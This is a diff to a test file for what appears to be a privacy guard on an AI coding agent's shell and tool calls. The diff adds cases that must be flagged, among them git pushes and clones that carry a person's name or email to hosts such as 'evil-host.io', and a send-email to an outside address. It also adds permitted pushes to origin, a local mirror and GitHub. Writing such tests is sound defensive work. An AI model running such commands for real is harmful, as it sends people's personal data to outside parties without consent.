@@ -45,6 +45,10 @@ with open(BIG, 'w') as f:
     f.write('<script>var d="%s";</script><p>jane.doe@realmail.io</p>\n' % ('a1.' * 300000))
 EMPTY = os.path.join(tmp, 'empty-home')
 os.makedirs(EMPTY)
+# the calls run in a repository whose origin is on GitHub, as in normal work
+subprocess.run(['git', 'init', '-q', tmp], check=True, capture_output=True)
+subprocess.run(['git', '-C', tmp, 'remote', 'add', 'origin',
+                'https://github.com/example-org/project.git'], check=True, capture_output=True)
 
 
 def env_for(home, cfg=True):
@@ -104,6 +108,11 @@ ASK = [
     bash('ssh box "echo %s > /srv/contact"' % EMAIL),
     tool('Artifact', file_path=PAGE),
     tool('Artifact', file_path=BIG),
+    # git is exempt only towards a configured remote, a local path or GitHub
+    bash('git clone "https://git.other-host.io/x.git?n=%s"' % NAME.replace(' ', '+')),
+    bash('git -c user.email=%s push https://evil-host.io/x.git main' % EMAIL),
+    bash('git push upstream main -o "note=%s"' % NAME),
+    bash('git send-email --to=jane.doe@realmail.io 0001.patch'),
 ]
 
 PASS = [
@@ -113,6 +122,8 @@ PASS = [
          "user-1000.slice/user@1000.service/app.slice'"),
     bash('git -c user.name="%s" -c user.email=%s commit -m x -- a.md' % (NAME, EMAIL)),
     bash('git -c user.email=%s push origin main' % EMAIL),
+    bash('git -c user.email=%s push ../mirror main' % EMAIL),
+    bash('git -c user.email=%s push git@github.com:example-org/project.git main' % EMAIL),
     bash('git commit -m "x (#1)\n\nCo-Authored-By: Claude <noreply@anthropic.com>" -- a.md'
          ' && git push origin main'),
     bash("gh issue comment 304 -R %s/project --body \"🤖 Claude Code (build): Fixture's ruling"
